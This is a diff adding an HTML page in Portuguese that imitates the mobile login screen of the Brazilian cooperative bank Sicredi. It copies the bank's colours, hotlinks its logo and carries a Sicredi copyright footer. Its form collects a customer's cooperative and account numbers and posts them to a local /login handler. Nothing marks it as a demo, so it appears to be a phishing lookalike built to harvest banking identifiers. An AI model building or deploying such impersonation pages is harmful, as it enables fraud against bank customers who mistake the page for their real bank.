@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicredi - Acesso Móvel</title>
+    <style>
+        :root {
+            --sicredi-green: #3fa110;
+            --sicredi-dark-green: #33820d;
+            --bg-gray: #f4f4f4;
+            --text-gray: #333;
+            --border-gray: #cdd3cd;
+        }
+        body { font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); margin: 0; padding: 0; color: var(--text-gray); }
+        header { background-color: #fff; padding: 20px; text-align: center; border-bottom: 4px solid var(--sicredi-green); }
+        .logo-img { max-width: 150px; height: auto; }
+        .main-container { padding: 20px; max-width: 500px; margin: 0 auto; }
+        .login-card { background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h2 { color: var(--sicredi-green); margin-top: 0; font-size: 22px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
+        input[type="text"], input[type="number"] { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid var(--border-gray); border-radius: 4px; font-size: 16px; }
+        .btn-primary { background-color: var(--sicredi-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .btn-primary:active { background-color: var(--sicredi-dark-green); }
+        .info-section { margin-top: 30px; background: #fff; border-radius: 8px; padding: 15px; border-left: 5px solid #ffcc00; }
+        footer { background-color: var(--sicredi-dark-green); color: white; text-align: center; padding: 15px 0; font-size: 12px; margin-top: 40px; }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://www.sicredi.com.br/static/portal/img/logo-sicredi.svg" alt="Sicredi" class="logo-img">
+    </header>
+
+    <div class="main-container">
+        <div class="login-card">
+            <h2>Acessar Conta</h2>
+            
+            <form id="loginForm" action="/login" method="POST">
+                <div class="form-group">
+                    <label for="coop">Cooperativa</label>
+                    <input type="number" id="coop" name="coop" placeholder="0000" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="conta">Conta (com dígito)</label>
+                    <input type="text" id="conta" name="conta" placeholder="00000-0" required>
+                </div>
+
+                <button type="submit" class="btn-primary">
+                    ACESSAR
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Sicredi - Todos os direitos reservados.</p>
+    </footer>
+</body>
+</html>
